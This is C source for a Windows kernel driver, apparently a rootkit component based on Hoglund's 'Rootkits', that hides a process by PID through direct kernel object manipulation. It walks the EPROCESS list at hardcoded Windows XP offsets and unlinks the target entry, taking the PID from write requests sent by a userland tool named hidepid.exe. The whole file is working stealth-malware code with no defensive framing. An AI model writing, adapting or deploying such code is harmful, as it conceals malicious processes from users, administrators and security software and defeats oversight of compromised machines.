/*
 * DKOM: hides processes
 *
 * Used with a userland application:
 *  $ hidepid.exe 42 : hide the process with 42 as PID
 *
 * references:
 *  http://www.adp-gmbh.ch/win/misc/writing_devicedriver.html
 *  Rootkits, Hoglund
 *  
 */

#include <ntddk.h>

#define PIDOFFSET 0x84 /* XP */
#define FLINKOFFSET 0x88 /* XP */

const WCHAR deviceLinkBuffer[]  = L"\\DosDevices\\DKOMDevice";
const WCHAR deviceNameBuffer[]  = L"\\Device\\DKOMDevice";

static void* GetEPROCAddrFromPID(unsigned pid)
{
  void* eproc = PsGetCurrentProcess();
  unsigned mypid = *((unsigned*)((unsigned long)eproc + PIDOFFSET)), ppid = mypid;
  do
  {
    /* next proc
     */
    eproc = ((char*)((LIST_ENTRY*)((unsigned long)eproc + FLINKOFFSET))->Flink - FLINKOFFSET);
    /* get proc pid
     */
    ppid = *((unsigned*)((unsigned long)eproc + PIDOFFSET));
    /* check
     */
    if (ppid == pid) return eproc;
  } while (ppid != mypid);
  return 0x0;
}

static int HidePID(unsigned pid)
{
  LIST_ENTRY* lst = 0;
  void* eproc = GetEPROCAddrFromPID(pid);
  if (!eproc) return 0;
  /* remove link
   */
  lst = (LIST_ENTRY*)((unsigned long)eproc + FLINKOFFSET);
  *((unsigned long*)lst->Blink) = (unsigned long)lst->Flink;
  *((unsigned long*)lst->Flink + 1) = (unsigned long)lst->Blink;
  /* update link
   */
  lst->Flink = (LIST_ENTRY*) &(lst->Flink);
  lst->Blink = (LIST_ENTRY*) &(lst->Flink);

  return 1;
}

void DriverUnload(PDRIVER_OBJECT driverObject)
{
	UNICODE_STRING DosDeviceName;
	DbgPrint("DriverUnload ...");
  RtlInitUnicodeString(&DosDeviceName, deviceLinkBuffer);
  IoDeleteSymbolicLink(&DosDeviceName);
  IoDeleteDevice(driverObject->DeviceObject);
}

NTSTATUS Irp_Write(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
  PIO_STACK_LOCATION pIoStackIrp; 
  PCHAR pInputBuffer;
  int pid;
  DbgPrint("Ipr_Write ..."); 
  pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);
  pid = pIoStackIrp->Parameters.Write.Length;
  if (HidePID(pid)) DbgPrint("Hide succeeded on %d!", pid);
  else DbgPrint("Hide failed on %d", pid);
  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

NTSTATUS	Irp_Nil(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
  DbgPrint("Ipr_Nil ...");
  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

NTSTATUS	DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
  PDEVICE_OBJECT pDeviceObject = NULL;
  UNICODE_STRING DeviceName;
  UNICODE_STRING DosDeviceName;
  NTSTATUS NtStatus;

	DbgPrint("DriverEntry ...");
  RtlInitUnicodeString(&DeviceName, deviceNameBuffer);
  RtlInitUnicodeString(&DosDeviceName,deviceLinkBuffer); 
  NtStatus = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
  if(!NT_SUCCESS(NtStatus)) return NtStatus;
  NtStatus = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);
  if(!NT_SUCCESS(NtStatus)) 
	{
		IoDeleteDevice(driverObject->DeviceObject);
    return NtStatus;
  }
  driverObject->MajorFunction[IRP_MJ_CREATE] = Irp_Nil;
  driverObject->MajorFunction[IRP_MJ_CLOSE] = Irp_Nil;
  driverObject->MajorFunction[IRP_MJ_WRITE] = Irp_Write;
  driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Irp_Nil;
  driverObject->MajorFunction[IRP_MJ_SHUTDOWN] = Irp_Nil;
  
  driverObject->DriverUnload = DriverUnload; 
  
  return STATUS_SUCCESS;
}
